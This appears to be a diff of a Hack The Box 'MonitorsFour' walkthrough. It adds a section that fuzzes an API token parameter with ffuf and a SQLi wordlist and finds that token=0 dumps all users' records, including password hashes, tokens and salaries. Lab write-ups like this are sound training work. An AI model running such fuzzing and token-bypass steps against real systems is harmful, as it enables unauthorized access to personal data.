@@ -107,7 +107,7 @@ Content-Length: 13688
 
 ## Subdomain bruteforce
 
-Following the blog post about `MonitorsThree` (The previous box in the series) of `0xdf`, in which he found a subdomain `cacti.monitorsthree.htb`, separate from the main website `monitorsthree.htb`, which looks identical to that of `monitorsfour`, I decided to bruteforce subdomains on monitorsfour with `ffuf`, and I found the subdomain `cacti.monitorsfour.htb`.
+Following the blog post about `MonitorsThree` (The previous box in the series) of [`0xdf`](https://0xdf.gitlab.io/2025/01/18/htb-monitorsthree.html#), in which he found a subdomain `cacti.monitorsthree.htb`, separate from the main website `monitorsthree.htb`, which looks identical to that of `monitorsfour`, I decided to bruteforce subdomains on monitorsfour with `ffuf`, and I found the subdomain `cacti.monitorsfour.htb`.
 
 ```
 
@@ -281,7 +281,7 @@ forgot_password.php     [Status: 200, Size: 3099, Words: 164, Lines: 84, Duratio
 ```
 
 
-### `/api/v2` and other api version
+### `/api/v2` and other api versions
 
 - Since there was a `/api/v1` endpoint on the target, I assumed there could be other versions
   of the api, like `/api/v2`, `/api/v3`, ... etc.
@@ -465,3 +465,72 @@ Content-Length: 36
 # Exploitation
 
 ## Fuzzing the `?token` parameter
+
+Based on the interaction with the previous api endpoints (`/api/user` and `/api/users`), it was
+assumed that the `token` parameter could be used in some kind of SQL query at the backend involving the resources
+under request. So it was fuzzed for an SQL injection using a generic list of SQLi payloads
+from [SecLists](https://github.com/danielmiessler/seclists), `/opt/SecLists-master/Fuzzing/Databases/SQLi/Generic-SQLi.txt`.
+
+Using the command below fuzzing was done.
+
+```sh
+ffuf -u http://monitorsfour.htb/api/v1/users?token=FUZZ -w /opt/SecLists-master/Fuzzing/Databases/SQLi/Generic-SQLi.txt:FUZZ -ac 
+```
+
+- The parameter `-ac` above does automatic calibration/filtering, but to be more explicit, we can use the `-fr` option,
+  which does filtering by regular expression.
+- What we want to filter out of the requests are instances in which there's the phrase `Invalid or missing token`.
+
+```sh
+/tools/ffuf/ffuf -u 'http://monitorsfour.htb/api/v1/users?token=FUZZ' -w /opt/SecLists-master/Fuzzing/Databases/SQLi/Generic-SQLi.txt:FUZZ  -fr "Invalid or missing token"
+```
+
+- When we do that, the request with payload `0` stands out of the command's output.
+
+```
+ :: Method           : GET
+ :: URL              : http://monitorsfour.htb/api/v1/users?token=FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists-master/Fuzzing/Databases/SQLi/Generic-SQLi.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: Invalid or missing token
+________________________________________________
+
+0                       [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 418ms]
+:: Progress: [268/268] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:04] :: Errors: 2 ::
+```
+
+- When this request is replayed in BurpSuite with the parameter `?token=0`, we get a JSON dump of all
+  users of the application.
+
+```http
+GET /api/v1/users?token=0 HTTP/1.1
+Host: monitorsfour.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+
+```http
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 23 Jan 2026 05:19:56 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+X-Powered-By: PHP/8.3.27
+Set-Cookie: PHPSESSID=69053d7663d5df3983905883893b29b8; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 1113
+
+[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
+```
